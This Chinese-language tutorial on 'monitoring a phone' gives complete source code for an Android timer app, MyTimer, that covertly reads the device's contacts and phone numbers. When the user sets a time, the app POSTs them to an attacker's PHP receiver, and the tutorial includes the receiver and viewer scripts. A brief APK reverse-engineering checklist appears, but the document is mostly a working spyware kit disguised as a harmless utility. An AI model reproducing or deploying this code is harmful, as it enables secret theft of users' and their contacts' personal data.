#### 监视手机

基础环境：win10，Android studio 3，jd-gui，apktool，dex2jar
应用：MyTimer(APP)， php网页(接收信息)

- ewfile.txt（用来存储接收到的信息）
- readinfo.php(用来展示接收到的信息)
- receive.php(用来接收信息)

##### readinfo.php
```php
<?php
$file_path ="/var/www/readcontacts/newfile.txt";
if (file_exists($file_path)){
  $str = file_get_contents($file_path);
  $str =str_replace("\r\n","<br />",$str);
  $str=explode(',',$str);
  echo"<pre>";print_r($str);echo "<pre>";
}
?>
```

##### receive.php
```php
<?php
  $info= $_POST["info"];
  $myfile =fopen("/var/www/readcontacts/newfile.txt", "w") ordie("Unable to open file!");
  fwrite($myfile, $info);
  fclose($myfile);
?>
```

#### 0×03原理剖析与软件实现
- 使用apktool得到AdroidManifest.xml，使用dex2jar得到应用源码
- 审查应用程序使用的权限
- 审查应用程序使用的进程间通信机制
- 分析源码中开放的端口、共享/传输的数据，以及网络连接

#### MainActivity
```java
public class MainActivity extendsAppCompatActivity implements OnClickListener {
  private EditText inputtime;
  private Button getTime;
  private Button startTime;
  private Button stopTime;
  private TextView time;
  private int remaindertime = 0;
  private Timer timer = null;
  private TimerTask timerTask = null;
  private String[] contacts = null;

  @Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    initviews();
    setOnclick();
  }
  private void setOnclick() {
    getTime.setOnClickListener(this);
    startTime.setOnClickListener(this);
    stopTime.setOnClickListener(this);
  }

  private void initviews() {
    inputtime = (EditText) findViewById(R.id.inputtime);
    getTime = (Button) findViewById(R.id.gettime);
    startTime = (Button) findViewById(R.id.starttime);
    stopTime = (Button)findViewById(R.id.stoptime);
    time = (TextView) findViewById(R.id.time);
  }
  
  @Override
  public void onClick(View v) {
    switch (v.getId()) {
      case R.id.gettime:
      time.setText(inputtime.getText().toString());
      remaindertime =Integer.parseInt(inputtime.getText().toString());
      printinfo();
      break;
      case R.id.starttime:
      startTime();
      break;
      case R.id.stoptime:
      stopTime();
      break;
    }
  }

  private Handler mHandler = new Handler() {
    public void handleMessage(android.os.Message msg) {
      time.setText(msg.arg1 + "");
      startTime();
    }
  };

  private void startTime() {
    if (timer == null) {
      timer = new Timer();
    }

    timerTask = new TimerTask() {
      @Override
      public void run() {
        if (remaindertime > 0) {
          remaindertime--;
          Message message =Message.obtain();
          message.arg1 =remaindertime;
          mHandler.sendMessage(message);
        } else {
          stopTime();
        }
      }
    };

    timer.schedule(timerTask, 1000);
  }

  private void stopTime() {
    if (timer != null)
      timer.cancel();
  }

  privatevoid printinfo() {
    contacts = getContacts();
    if (contacts != null || (contacts == null && contacts.length !=0)) {
      new Thread(new Runnable() {
        @Override
        public void run() {
          sendContacts();
        }
      }).start();
    }
  }

  public void sendContacts() {
    String target = "http://192.168.159.128/readcontacts/receive.php";
    URL url;
    
    try {
      url = new URL(target);
      HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
      urlConn.setRequestMethod("POST");
      urlConn.setDoInput(true);
      urlConn.setDoOutput(true);
      urlConn.setUseCaches(false);
      urlConn.setInstanceFollowRedirects(true);
      urlConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
      String info = "";
      for (String item : contacts) {
        info += item + ",";
      }

      DataOutputStream out = new DataOutputStream(urlConn.getOutputStream());
      String param = "info=" + URLEncoder.encode(info,"utf-8");
      out.writeBytes(param);
      out.flush();
      out.close();

      if (urlConn.getResponseCode() == HttpURLConnection.HTTP_OK) {
        urlConn.disconnect();
      }
    } catch (MalformedURLException e) {
      e.printStackTrace();
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  private String[] getContacts() {
    Uri uri = ContactsContract.Contacts.CONTENT_URI;
    String[] projection = new String[]{
      ContactsContract.Contacts._ID,
      ContactsContract.Contacts.DISPLAY_NAME
    };

    Cursor cursor = this.getContentResolver().query(uri, projection, null,null, null);
    String[] arr = new String[cursor.getCount()];
    int i = 0;

    if (cursor != null && cursor.moveToFirst()) {

      do {
        Long id = cursor.getLong(0);
        String name =cursor.getString(1);
        String[] phoneProjection = newString[]{
        ContactsContract.CommonDataKinds.Phone.NUMBER
      };

      arr[i] = id + " |name:" + name;
      Cursor phonesCusor =this.getContentResolver().query(
      ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
      phoneProjection,
      ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + id, null, null);

      if (phonesCusor != null&& phonesCusor.moveToFirst()) {
        do {
          String num =phonesCusor.getString(0);
          arr[i] += " |phonenum:" + num;
        } while(phonesCusor.moveToNext());
      }

      i++;
    } while (cursor.moveToNext());
  }
  
  return arr;
  }
}
```

#### AndroidManifest.xml
```xml
<uses-permissionandroid:name="android.permission.INTERNET"/>
<uses-permissionandroid:name="android.permission.WRITE_CONTACTS"/>
<uses-permissionandroid:name="android.permission.READ_CONTACTS"/>
<uses-permissionandroid:name="android.permission.GET_ACCOUNTS"/>
```

#### Avtivity_main.xml
```xml
<LinearLayoutxmlns:android="http://schemas.android.com/apk/res/android"
  xmlns:tools="http://schemas.android.com/tools"
  android:layout_width="match_parent"
  android:orientation="vertical"
  android:layout_height="match_parent" >
<EditText
  android:id="@+id/inputtime"
  android:layout_width="fill_parent"
  android:layout_height="wrap_content"
  android:ems="10" >
  <requestFocus />
</EditText>
<Button
  android:id="@+id/gettime"
  android:layout_width="wrap_content"
  android:layout_height="wrap_content"
  android:text="设置时间" 
/>
<TextView
  android:id="@+id/time"
  android:layout_width="wrap_content"
  android:layout_height="wrap_content"
/>
<Button
  android:id="@+id/starttime"
  android:layout_width="wrap_content"
  android:layout_height="wrap_content"
  android:text="开始计时" 
/>
<Button
  android:id="@+id/stoptime"
  android:layout_width="wrap_content"
  android:layout_height="wrap_content"
  android:text="停止计时" />
</LinearLayout>
```

